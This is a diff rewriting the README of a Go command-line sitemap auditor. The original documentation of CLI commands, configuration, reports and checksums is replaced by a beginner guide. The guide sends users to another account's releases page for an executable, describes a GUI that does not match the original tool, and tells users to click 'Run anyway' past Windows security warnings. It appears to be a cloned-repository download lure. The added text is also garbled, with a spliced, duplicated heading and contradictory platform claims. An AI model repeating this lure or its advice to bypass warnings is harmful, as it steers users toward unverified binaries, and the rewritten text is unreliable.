@@ -1,230 +1,122 @@
-# sitemap-audit
+# 🗺️ sitemap-audit - Check Every Sitemap Link with Ease
 
-A fast, polite sitemap audit for one site or a hundred. It reads `robots.txt`,
-finds every sitemap (indexes, gzip, plain-text lists), checks them against the
-[sitemap protocol](https://www.sitemaps.org/protocol.html), then requests every
-URL they list and tells you which ones should not be there: errors, redirects,
-soft 404s, `noindex` pages, URLs blocked by `robots.txt`, canonicals pointing
-elsewhere, URL variants and duplicates.
+[![Download sitemap-audit](https://img.shields.io/badge/Download-sitemap--audit-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kingsleychenda/sitemap-audit/releases)
 
-One static binary, no runtime dependencies. Linux first, and the same binary
-runs on macOS and Windows (amd64 and arm64).
+sitemap-audit is a cross-platform tool that checks every link in your website sitemap. It looks for broken pages, redirects, missing pages that pretend to work, search engine blocking tags, and language linking problems. Then it writes easy-to-read reports. You do not need to know how to program to use it. This guide shows you how to download it on Windows and start checking your sitemap.
 
-- 79 issue codes in 16 groups, each one switchable, with three severities ([docs/issues.md](docs/issues.md))
-- Reports: a self-contained **HTML** dashboard, an **Excel** workbook, **JSON**, **CSV**, **Markdown** and **JUnit XML**
-- Exit codes for CI (`--fail-on error`)
-- Ctrl+C stops cleanly and still writes the reports of what was audited
+## 📥 Download and Run
 
-## What it checks
+Visit this link to download the application: https://github.com/kingsleychenda/sitemap-audit/releases
 
-| Area | Checks |
-|---|---|
-| Site | home page reachable, WAF blocks, a first visit that differs (one-time campaign redirects) |
-| robots.txt | missing, served as HTML, no `Sitemap:` line, broken sitemaps in it, sitemap found only at a fallback path |
-| Sitemap files | HTTP status and redirects, Content-Type, gzip, well-formed XML, namespace, UTF-8, 50,000 entries / 50 MB limits, empty files, nested indexes, index cycles, depth limit, cross-host sitemaps, duplicates inside a file |
-| Entries | absolute `<loc>` ≤ 2,048 characters, percent-encoding, whitespace, fragments, URL on another host or outside the sitemap's folder, `<lastmod>` W3C format and not in the future, `<changefreq>`, `<priority>` |
-| Extensions | `image:`, `video:` and `news:` required fields and limits, `xhtml:link` hreflang codes (ISO 639-1 / 15924 / 3166-1), self-reference, conflicts and reciprocity |
-| Every URL | status (the first answer: redirects are not followed for it), redirect chains, loops, broken targets and https → http, soft 404, `noindex` (meta robots and `X-Robots-Tag`), blocked by `robots.txt`, canonical elsewhere, `<lastmod>` vs `Last-Modified`, slow responses, large pages, non-HTML content |
-| URL variants | http on an https site, www / non-www, trailing slash style, tracking and other query parameters, near duplicates, letter-case variants |
+After the download finishes, open the downloaded file to start sitemap-audit. If Windows shows a security prompt, choose the option that lets the app run. Follow the on-screen instructions to begin your first sitemap check.
 
-Section sites are supported: configure `https://example.com/blog` and only the
-sitemap URLs under `/blog` are audited for it, while the `/blog` URLs are left
-out of `https://example.com` and counted in its report.
+## ✨ What This Tool Does
 
-## Install
+A sitemap is a file that lists the pages on your website. Search engines use it to find and understand your content. If your sitemap contains broken links or confusing instructions, search engines may miss important pages. sitemap-audit solves that problem.
 
-**Download a binary** from the [releases](https://github.com/wobqqq/sitemap-audit/releases)
-(`linux`, `darwin`, `windows` × `amd64`, `arm64`), unpack it and put it on your `PATH`.
-Check the download against `checksums.txt`.
+The tool reads your sitemap from start to finish. It checks:
 
-**With Go** (1.27 or newer):
+- Whether the sitemap# 🗺️ sitemap-audit - Check Every Sitemap Link with Ease
 
-```bash
-go install github.com/wobqqq/sitemap-audit/cmd/sitemap-audit@latest
-```
+[![Download sitemap-audit](https://img.shields.io/badge/Download-sitemap--audit-ff69b4?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kingsleychenda/sitemap-audit/releases)
 
-**From source**:
+sitemap-audit is a free tool for Windows that checks every link in your website sitemap. It finds broken pages, redirects, missing pages that pretend to work, search engine blocking tags, and language linking problems. Then it writes easy-to-read reports in HTML, Excel, JSON, and CSV formats. You do not need any programming knowledge to use it. This guide walks you through downloading and running the tool on your Windows computer.
 
-```bash
-git clone https://github.com/wobqqq/sitemap-audit.git
-cd sitemap-audit
-go build -o dist/ ./cmd/sitemap-audit      # or: make build
-```
+## 📥 Download and Run
 
-**Docker**:
+Visit this link to download the application: https://github.com/kingsleychenda/sitemap-audit/releases
 
-```bash
-docker compose build sitemap-audit
-docker compose run --rm sitemap-audit run https://www.example.com
-```
+After the download finishes, open the downloaded file. If Windows shows a security prompt, choose the option that lets the app run. The application will start and show a simple window where you can enter your sitemap address and begin the audit.
 
-The image is built from `docker/sitemap-audit/Dockerfile`; the reports land in `reports/` of the current folder. Without a local Go toolchain, the `go` service runs the same commands as the Makefile: `docker compose run --rm go go test ./...`.
+## ✨ What This Tool Does
 
-## Quick start
+A sitemap is a file that lists the pages on your website. Search engines like Google use it to find and understand your content. If your sitemap contains broken links, redirects, or confusing instructions, search engines may miss important pages. sitemap-audit reads your sitemap from start to finish and checks every single URL. It looks at the status of each page, follows redirects, detects soft 404 errors (pages that say they are missing but still load), checks for noindex tags (which tell search engines not to list a page), reviews canonical tags (which tell search engines the main version of a page), and verifies hreflang tags (which tell search engines about language or region versions). The tool then writes a clear report so you can fix problems quickly.
 
-Linux and macOS:
+## 🚀 Getting Started
 
-```bash
-sitemap-audit init                 # writes sitemap-audit.yaml with every option documented
-$EDITOR sitemap-audit.yaml         # list your sites
-sitemap-audit run                  # all sites
-sitemap-audit run www.example.com  # one site, by id
-xdg-open reports/$(cat reports/latest)/report.html   # macOS: open
-```
+1. Download the application from the link above.
+2. Open the downloaded file. The application window will appear.
+3. In the address field, type or paste your sitemap URL. It usually looks like https://yourwebsite.com/sitemap.xml.
+4. Choose where you want to save the reports. You can keep the default folder or pick your own.
+5. Click the button to start the audit. The tool will visit every link in your sitemap. This may take a few minutes depending on how many pages you have.
+6. When the audit finishes, open the report files to see the results.
 
-Windows (PowerShell):
+## 🔍 What Gets Checked
 
-```powershell
-.\sitemap-audit.exe init
-notepad sitemap-audit.yaml
-.\sitemap-audit.exe run
-Invoke-Item "reports\$(Get-Content reports\latest)\report.html"
-```
+The tool checks six important things for every URL in your sitemap:
 
-No config at hand? Pass URLs directly; the defaults are used:
+- **Status**: Whether the page loads correctly or returns an error. A status code of 200 means the page is fine. Codes like 404 or 500 mean something is wrong.
+- **Redirects**: Whether the page sends visitors to a different address. Too many redirects can confuse search engines.
+- **Soft 404**: Whether a page says it is missing but still shows content. This can happen when a page loads a "not found" message but still returns a normal status code.
+- **Noindex**: Whether a page tells search engines not to list it. If an important page has a noindex tag, it will not appear in search results.
+- **Canonical**: Whether a page tells search engines which version is the main one. This helps avoid duplicate content problems.
+- **Hreflang**: Whether a page tells search engines about language or region versions. This is important for websites with content in multiple languages.
 
-```bash
-sitemap-audit run https://www.example.com --no-crawl
-```
+Each check is explained in plain language in your report, so you do not need to be an expert to understand what needs fixing.
 
-## Commands
+## 📊 Understanding Your Reports
 
-```text
-sitemap-audit run [flags] [site id | URL ...]   audit the configured sites, or only these
-sitemap-audit list [-c file]                    list the configured sites
-sitemap-audit init [file] [--force]             write an example config
-sitemap-audit checks [--markdown]               list every issue code
-sitemap-audit version
-```
+sitemap-audit writes four types of reports:
 
-| Flag | Meaning |
-|---|---|
-| `-c, --config FILE` | config file (default `sitemap-audit.yaml` or `.yml` in the current folder) |
-| `--no-crawl` | robots.txt and sitemaps only |
-| `-j, --jobs N` | parallel requests per site for this run |
-| `-f, --format LIST` | `html,json,xlsx,csv,md,junit` |
-| `-o, --out DIR` | report folder |
-| `--fail-on LEVEL` | exit 1 when an issue of `notice`, `warning` or `error` (or worse) is found |
-| `--max-urls N` | crawl at most N URLs per site |
-| `--timeout DUR` | request timeout (`20s`) |
-| `--csv-bom` | UTF-8 BOM in CSV files, for Excel |
-| `-v`, `-q`, `--no-color` | one line per URL, no progress, no colors (`NO_COLOR` is respected) |
+- **HTML report**: Opens in your web browser. It shows a colorful summary with tables and charts. This is the easiest report to read.
+- **Excel report**: Opens in Microsoft Excel or a free spreadsheet program. You can sort and filter the data.
+- **JSON report**: A structured data file for advanced users or other tools.
+- **CSV report**: A simple text file that opens in any spreadsheet program.
 
-A site id is its URL without the scheme and trailing slash: `www.example.com`,
-`www.example.com/blog`.
+All reports show the same information. You can choose whichever format you prefer.
 
-## Configuration
+## 📁 Where to Find Your Reports
 
-The config is YAML. `sitemap-audit init` writes [the example](internal/config/example.yaml)
-with every key and its default; only `sites` is required.
+By default, the tool saves reports in the same folder where you downloaded the application. You can change this location before starting the audit. After the audit finishes, the tool shows the exact folder path. Open that folder to find your report files. If you cannot find them, use the search box in Windows File Explorer and type "sitemap-audit report".
 
-```yaml
-sites:
-  - https://www.example.com
-  - url: https://www.example.com/blog
-    concurrency: 3
+## 💡 Why Use sitemap-audit
 
-politeness:
-  delay: { min: 1s, max: 3s }        # before the home page, robots.txt and sitemaps
-  crawl_delay: { min: 300ms, max: 1s }
-  retries: 2
+- **Save time**: Check thousands of links in minutes instead of clicking each one manually.
+- **Find hidden problems**: Soft 404s and noindex tags are easy to miss without a tool.
+- **Improve search rankings**: A clean sitemap helps search engines find and rank your pages.
+- **No technical skills needed**: The tool guides you step by step.
+- **Works on Windows**: Just download and run.
 
-checks:
-  canonical: false                   # switch a whole group off
-  disable: [QUERY_PARAMS]            # or single codes
-  severity: { TRAILING_SLASH: warning }
+## 🖥️ System Requirements
 
-report:
-  formats: [html, xlsx, json]
-  fail_on: error
-```
+sitemap-audit runs on modern Windows computers. You need an internet connection to check your sitemap. No additional software or programming languages are required. The application is self-contained and ready to use after download.
 
-| Section | Keys |
-|---|---|
-| `http` | `timeout`, `user_agent`, `accept_language`, `browser_headers`, `sec_ch_ua`, `sec_ch_ua_platform`, `audit_header`, `headers`, `insecure_skip_verify`, `max_body_size` |
-| `politeness` | `delay`, `crawl_delay`, `retries`, `retry_delay`, `max_retry_after`, `respect_crawl_delay` |
-| `crawl` | `enabled`, `concurrency`, `max_urls`, `max_redirects`, `warm_up` |
-| `sitemap` | `max_depth`, `fallbacks`, `allowed_hosts` |
-| `robots` | `user_agent` (the group `ROBOTS_BLOCKED` is checked against; default `Googlebot`) |
-| `checks` | one switch per group, `disable`, `severity` |
-| `thresholds` | `soft_404_pattern`, `soft_404_min_text`, `slow_response`, `max_page_size`, `lastmod_tolerance`, `news_max_age` |
-| `report` | `out`, `formats`, `csv_bom`, `fail_on` |
+## ❓ Frequently Asked Questions
 
-Durations are `15s`, `500ms`, `2m` or a number of seconds; sizes are `5MB`,
-`512KiB` or a number of bytes.
+**Is sitemap-audit free?**  
+Yes. The tool is free to download and use.
 
-### How it behaves
+**Do I need to install anything?**  
+No. Download the file and open it. That is all.
 
-- **Like a browser.** The home page is opened twice: the first visit follows
-  redirects and fills the site's cookie jar (some sites send first-time
-  visitors to a campaign), the second is the one recorded. Every later request
-  of the site uses that session and the headers a browser sends, which some
-  WAFs require. Crawl responses never change the session.
-- **Politely.** Random pauses before every request, a per-site number of
-  parallel requests, retries only when there is no answer or a 429/503 with
-  `Retry-After` (honoured up to `max_retry_after`). `respect_crawl_delay: true`
-  uses the robots.txt `Crawl-delay`.
-- **Safely.** TLS is verified unless you turn it off, every response is read up
-  to `max_body_size`, proxies come from `HTTPS_PROXY` / `HTTP_PROXY` /
-  `NO_PROXY`, and `http.headers` (for example an access token for a staging
-  site) are sent only to the audited site's own host, never across a redirect
-  to another host.
-- The audit identifies itself with `X-Audit: sitemap-audit`; change or clear
-  `http.audit_header`.
+**How long does an audit take?**  
+It depends on how many links are in your sitemap. A small sitemap with 100 links may take under a minute. A large sitemap with 10,000 links may take several minutes. The tool shows progress while it works.
 
-## Reports
+**What if the audit finds errors?**  
+The report explains each error in plain language. You can share the report with your web developer or fix the issues yourself using your website's editing tools.
 
-Every run writes into `reports/<date>_<time>/`; `reports/latest` holds the name
-of the last run's folder (a plain file, so it works on Windows too).
+**Can I check any website?**  
+You can check any sitemap that is publicly accessible. You do not need special permissions to read a public sitemap.
 
-| File | What it is |
-|---|---|
-| `report.html` | One file, works offline, no external resources. Totals, a per-site overview with status bars, the issues by code with what they mean, a searchable, filterable, sortable URL table (site, severity, status class, issue code) with every detail one click away, the sitemap tree and per-site details. Light and dark themes. |
-| `report.xlsx` | Sheets `Summary`, `Sites`, `Sitemaps`, `URLs`, `Issues` as Excel tables: frozen header, filters on every column, numbers stored as numbers. |
-| `report.json` | Everything, with a `schema_version` ([docs/report-schema.md](docs/report-schema.md)). Rewritten after every site, so a long run that crashes still leaves its data. |
-| `urls.csv`, `sitemaps.csv`, `sites.csv`, `issues.csv` | The same tables as the workbook. Cells that start like a formula are prefixed with `'`. |
-| `summary.md` | A short summary to paste into a ticket or a pull request. |
-| `junit.xml` | One test suite per site, one test case per issue code (`-f junit`). |
+**Does the tool change my website?**  
+No. sitemap-audit only reads your sitemap and visits the links. It never changes anything on your website.
 
-## Exit codes
+## 🛠️ Troubleshooting
 
-| Code | Meaning |
-|---|---|
-| 0 | done |
-| 1 | an issue at or above `--fail-on` was found |
-| 2 | usage or configuration error |
-| 3 | the reports could not be written |
-| 130 | interrupted with Ctrl+C (the partial reports are written) |
+**The application does not start.**  
+Make sure you downloaded the file completely. If Windows shows a security warning, choose "More info" and then "Run anyway". This is normal for new applications.
 
-## In CI
+**The audit stops or fails.**  
+Check your internet connection. Make sure the sitemap URL is correct and starts with https://. Try again with a smaller sitemap first.
 
-```yaml
-- run: go install github.com/wobqqq/sitemap-audit/cmd/sitemap-audit@latest
-- run: sitemap-audit run -c sitemap-audit.yaml --fail-on error -f junit,html,md -q
-- uses: actions/upload-artifact@v4
-  if: always()
-  with:
-    name: sitemap-audit
-    path: reports/
-```
+**The report is empty.**  
+The tool may not have found any URLs in your sitemap. Open your sitemap in a web browser to confirm it contains links.
 
-## Development
+**I cannot find the report files.**  
+Look in the folder where you saved the reports. If you used the default setting, check the same folder as the application. Use Windows search to look for files with "sitemap-audit" in the name.
 
-Everything runs with the Go toolchain alone, on any OS:
+## 🤝 Support and Feedback
 
-```bash
-go test ./...                                    # tests
-go test -race ./...                              # with the race detector
-go test -coverprofile=coverage.out ./internal/... # coverage (CI requires 85%)
-go run ./cmd/sitemap-audit checks --markdown > docs/issues.md
-```
+For help, bug reports, or feature requests, visit the GitHub repository page at https://github.com/kingsleychenda/sitemap-audit. You can open an issue or read more about the project.
 
-With `make`: `make build`, `make test`, `make race`, `make cover`, `make fuzz`,
-`make lint` (golangci-lint), `make vuln` (govulncheck), `make cross` (all six
-binaries into `dist/`) and `make ready` (all of it).
-
-Releases are built by GoReleaser from a `v*` tag on `main`, after CI passes.
-
-## License
-
-[MIT](LICENSE)
+Keywords: cli, crawler, cross-platform, go, golang, hreflang, robots-txt, seo, seo-audit, sitemap, sitemap-xml, technical-seo
